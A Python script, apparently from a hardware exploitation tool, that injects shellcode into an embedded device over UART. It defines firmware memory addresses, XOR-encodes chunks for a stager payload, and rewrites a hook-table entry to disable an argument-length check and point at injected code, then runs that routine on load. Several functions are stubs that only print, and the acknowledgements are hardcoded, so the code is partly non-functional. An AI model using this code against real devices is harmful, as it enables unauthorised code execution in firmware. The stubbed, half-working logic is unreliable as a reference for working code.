import struct
import os
# Runtime configs
# The number of seconds to sleep between every request to avoid UART buffer overflows
SEND_REQ_SAFETY_SLEEP_AMT = 0.01


# The default location of the stager payload
STAGER_PL_FILENAME = "payloads/stager/stager.bin"


# The default location of the memory dumping payload used for the dump_mem command
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"

# The address of the first payload we are injecting
FIRST_PAYLOAD_LOCATION = 0x10010100


# FIRST_PAYLOAD_LOCATION = 0x06D8C300
next_payload_location = FIRST_PAYLOAD_LOCATION

# Maximum number of bytes to be sent in one request (Sending chunks larger than 16 bytes seems to overflow the read buffer)
# MAX_MSG_LEN = 64-2
MAX_MSG_LEN = 192-2

# Addresses used to inject shellcode (different values are possible here)
DEFAULT_STAGER_ADDHOOK_IND = 0x20


# For installing an additional hook, we also assign a default index
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a

#IRAM_STAGER_START = 0x1003AD00
#IRAM_STAGER_END = 0x10040000
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
#IRAM_STAGER_START = 0x10010000
#IRAM_STAGER_END = 0x10020000
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START

BOOTLOADER_EMPTY_MEM = 0x20000

# Some constants that make the code a bit more easy to read
ANSW_INVALID_CHECKSUM = b"\xff\x80\x03"
ANSW_ENTER_SUBPROTO_SUCCESS = b"\x80\x00"

# Static Addresses
UART_WRITE_BUF = 0x100367EC
UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003ABA0

# subprotocol handler constants
SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4

SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]
def invoke_primary_handler(r, handler_ind, args=b"", await_response=True):
    """
    Invoke the primary handler with index handler_ind.
    """

    msg =args
    print(msg)
    if isinstance(msg, bytes):
        msg = bytes([len(msg)+1]) + msg
    else:
        msg = chr(len(msg)+1)+msg
    msg = msg + bytes([calc_checksum_byte(msg)])
    print(f"invoke_primary_handler - Sending packet: {msg.hex()}")

def send_packet(r, msg, chunk_size=2, sleep_amt=0.01):
    print(f"send_packet - Sending packet: {msg.hex()}")


def encode_packet_for_stager(chunk):
    """
    Encodes a packet for null-byte free transmission to the stager.
    Xor is used to do the encoding. The key is chosen for the chunk
    not to include null bytes which seem to result in the largest
    amount of failing transmissions over UART.
    
    The encoding has to be reversed on the other side which is
    implemented in the payloads/stager sources
    """
    print("Encoding packet for stager: {}".format(chunk.hex()))
    for i in range(1, 256):
        if i not in chunk and i != len(chunk)+2:
            print("Sending chunk with xor key: 0x{:02x}".format(i))
            encoded = bytes([i]) + bytes([b ^ i for b in chunk])
            # A quick attempt at a fix for a specific value-dependent UART failure
            #if b"\xfe\xfe" in encoded:
            #    continue
            return encoded

    print("Could not encode chunk: {}".format(chunk.hex()))
    assert (False)

def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
    """
    Transmit an arbitrarily sized message to a listening stager payload.

    The protocol doing the transmission sends an encoded packet, expecting
    an empty acknowledgement packet in return for each packet sent.
    """

    for i in range(0, len(msg), MAX_MSG_LEN-1):
        # time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        chunk = msg[i:i + MAX_MSG_LEN - 1]
        print("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i)/float(len(msg))))
        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt)
        # answ = recv_packet(r)
        answ = b"\x00"
        if not len(answ) == 1:
            print("expecting empty ack package (answ of size 1), got '{}' instead".format(answ))
            assert(False)
        if answ == b"\xff":
            print("[WARNING] Interrupting the sending...")
            return None
    # Send empty packet to signify end of transmission
    send_packet(r, encode_packet_for_stager(b""))
    # answ = recv_packet(r)
    return answ
def calc_checksum_byte(incoming):
    # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
    # Checksum: LSB of negative sum of byte values
    if isinstance(incoming, bytes):
        return struct.pack("<i", -sum(incoming[:incoming[0]]))[0]
    else:
        return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]

    # send_packet(r, payload+args)
    # if await_response:
    #     return recv_packet(r)
    # else:
    #     return None


def invoke_add_hook(r, add_hook_no, args=b"", await_response=True):
    # Check range for additional hook
    assert(0 <= add_hook_no <= 0x20)
    # Also check that the size of arguments that we input matches the expected value
    # expected_arglen, fn_addr = add_handler_entries[add_hook_no]
    #assert(expected_arglen-3==len(args) or expected_arglen==0xff)
    hook_ind = 0x1c
    args = bytes([add_hook_no]) + args
    print(f"invoke_add_hook - Sending packet: {args.hex()}")
    return invoke_primary_handler(r, hook_ind, args, await_response)


# install_addhook_via_stager( tar_addr = 0x10010100, "Path to payload" , stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND = 0x20, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND = 0x1a):
def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    print(f"write_via_stager - Writing to address: 0x{tar_addr:08X}")

    invoke_add_hook(r, stager_add_hook_ind,
                       struct.pack(">I", tar_addr), False)
    send_full_msg_via_stager(r, contents, 8, 0.01)



def install_addhook_via_stager(r, tar_addr=0x10010100, shellcode="spiffs/hello_world.bin", stager_addhook_ind=0x20, add_hook_no=0x1a):
    # Automatically adjust to the user adding more payloads
    global next_payload_location
    
    # Set up function pointer and disable arbitrary argument length check (by setting value 0xff)
    write_via_stager(r, ADD_HOOK_TABLE_START+8*add_hook_no,
                     b"\x00\x00\x00\xff"+struct.pack(">I", tar_addr), stager_addhook_ind)

    # Write the code of the handler itself
    shellcode = open(shellcode, "rb").read()
    write_via_stager(r, tar_addr, shellcode, stager_addhook_ind)

    if tar_addr == next_payload_location:
        next_payload_location += len(shellcode)
        while next_payload_location % 4 != 0:
            next_payload_location += 1

    return add_hook_no


install_addhook_via_stager(None)

# Got address: b'\x10\x03\xacp'
# b'\x1c \x10\x03\xacp'
# sending packet: 071c201003ac708e




